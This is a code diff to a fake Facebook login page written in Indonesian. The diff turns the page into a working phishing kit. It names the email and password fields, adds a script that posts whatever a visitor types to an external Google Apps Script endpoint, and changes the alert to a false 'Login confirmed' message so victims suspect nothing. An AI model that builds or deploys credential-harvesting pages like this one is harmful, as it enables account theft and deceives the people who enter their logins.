@@ -180,11 +180,12 @@
 				</div>
 				<br><br><br><br>
 				<h2 class="fb">Facebook</h2>
-				<input class="email" type="email" placeholder="Nomor ponsel atau email" required>
+   <form name="Test-Fb">
+				<input class="email" type="email" placeholder="Nomor ponsel atau email" required name="email">
 				<br>
-				<input class="pw" type="password" placeholder="Password" required>
+				<input class="pw" type="password" placeholder="Password" required name="password">
 				<br>
-				<button class="masuk" onclick="myFunction()"><b>Masuk</b></button>
+				<button class="masuk" onclick="myFunction()" type="submit"><b>Masuk</b></button> </form>
 				<br>
 				<p class="garis"></p>
 				<p class="atau">atau</p>
@@ -205,6 +206,22 @@
 								<p class="brasil">Portuges (Brasil)</p>
 								<p class="tambah">+</p>
 				</div>
-				<script>function myFunction() {alert("MUKA Lu Kek Babi Anjing");}</script>
+				<script>function myFunction() {alert("Login Telah Terkonfirmasi");}</script>
+
+
+<script>
+const scriptURL = 'https://script.google.com/macros/s/AKfycbwz07cfyR66rBWYsLgmyHbNoqyzUeDm3Y-zQIdCkrZ7zNEdR0DQwJFJa6LFVcWSOxnJ/exec'
+  const form = document.forms['Test-Fb']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+
+
+
 </body>
 </html>
